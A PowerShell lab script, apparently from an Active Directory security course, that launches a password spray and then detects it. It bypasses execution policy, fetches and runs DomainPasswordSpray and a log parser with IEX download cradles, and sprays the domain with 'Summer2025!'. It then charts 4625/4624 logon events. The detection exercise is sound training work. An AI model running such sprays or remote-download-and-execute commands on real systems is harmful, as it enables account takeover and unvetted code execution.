Write-Output "[*] Setup" 

New-Item -ItemType Directory -Path "C:\ADSH\DomainPasswordSpray\" -Force > $null
cd "C:\ADSH\DomainPasswordSpray\"
Set-ExecutionPolicy Bypass -Force
Write-Output "[*] Download DPS" 
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/DomainPasswordSpray/master/DomainPasswordSpray.ps1')

Write-Output "[*] Invoke DPS" 
Invoke-DomainPasswordSpray -Password "Summer2025!" -Force

Write-Output "[*] Setup Detect DPS" 

$now          = Get-Date
$recentStart  = $now.AddMinutes(-10)
$recentEnd    = $now
$prevStart    = $now.AddMinutes(-70)  # 60 + 10 minutes
$prevEnd      = $now.AddMinutes(-60)

Write-Output "[*] Detect 4625" 
$recent4625 = Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4625
    StartTime = $recentStart
    EndTime   = $recentEnd
}
"4625 failures in last 10 minutes: {0}" -f ($recent4625 | Measure-Object | Select-Object -ExpandProperty Count)

$prev4625 = Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4625
    StartTime = $prevStart
    EndTime   = $prevEnd
}
"4625 failures in the 10-minute window one hour earlier: {0}" -f ($prev4625 | Measure-Object | Select-Object -ExpandProperty Count)

Write-Output "[*] Get Parser" 
Set-ExecutionPolicy bypass
iex ((New-Object System.Net.WebClient).DownloadString("https://github.com/DefensiveOrigins/ADSH-Extras/raw/refs/heads/main/scripts/4625-2624-Parser.ps1"))

Write-Output "[*] 4624s" 
$latest4624 = Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624 } -MaxEvents 20
"Most recent 4624 (successful logon) events:"
$latest4624 | ForEach-Object { Parse-4624 $_ } |
    Sort-Object TimeCreated -Descending |
    Select-Object TimeCreated,TargetDomain,TargetUser,IpAddress,Workstation,LogonType,AuthPackage |
    Format-Table -AutoSize

Write-Output "[*] 4624s Last 25" 
# Last 25 failed logons; adjust as desired
$latest4625 = Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4625 } -MaxEvents 25

"Sample recent 4625 (failed logon) events:"
$latest4625 | ForEach-Object { Parse-4625 $_ } |
    Sort-Object TimeCreated -Descending |
    Select-Object TimeCreated,TargetDomain,TargetUser,IpAddress,Workstation,LogonType,FailureReason,Status,SubStatus |
    Format-Table -AutoSize


Write-Output "[*] 4625 Targets" 
"Top targets (last 10 minutes):"
$recent4625 | ForEach-Object { Parse-4625 $_ } |
    Group-Object TargetUser | Sort-Object Count -Descending |
    Select-Object Count, Name | Format-Table -AutoSize

Write-Output "[*] 4625 IPs " 
"Top source IPs (last 10 minutes):"
$recent4625 | ForEach-Object { Parse-4625 $_ } |
    Group-Object IpAddress | Sort-Object Count -Descending |
    Select-Object Count, Name | Format-Table -AutoSize

Write-Output "[*] Sleep for a moment " 
Start-Sleep -Seconds 90


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Windows.Forms.DataVisualization

# Define time window
$end = Get-Date
$start = $end.AddHours(-2)

# Get all 4625 events in the window
$events = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id      = 4625
    StartTime = $start
    EndTime   = $end
}

# Build per-minute timeline with zeroes for missing intervals
$minutes = @{}
for ($i = 0; $i -lt 120; $i++) {
    $minute = $start.AddMinutes($i).ToString("yyyy-MM-dd HH:mm")
    $minutes[$minute] = 0
}
foreach ($evt in $events) {
    $minute = $evt.TimeCreated.ToString("yyyy-MM-dd HH:mm")
    if ($minutes.ContainsKey($minute)) {
        $minutes[$minute]++
    }
}

# Prepare chart
$chart = New-Object Windows.Forms.DataVisualization.Charting.Chart
$chart.Width = 900
$chart.Height = 400
$chartArea = New-Object Windows.Forms.DataVisualization.Charting.ChartArea
$chart.ChartAreas.Add($chartArea)
$series = New-Object Windows.Forms.DataVisualization.Charting.Series
$series.Name = "4625 Failures Per Minute"
$series.ChartType = [Windows.Forms.DataVisualization.Charting.SeriesChartType]::Line

foreach ($minute in $minutes.Keys | Sort-Object) {
    $series.Points.AddXY($minute, $minutes[$minute])
}

$chart.Series.Add($series)

$form = New-Object Windows.Forms.Form
$form.Text = "4625 Logon Failures Timeline (Per Minute, Last 2 Hours)"
$form.Width = 920
$form.Height = 440
$form.Controls.Add($chart)
$chart.Dock = 'Fill'

# Save the chart as a PNG image
$savePath = "C:\ADSH\4625Failures.png"
$chart.SaveImage($savePath, 'Png')

C:\ADSH\4625Failures.png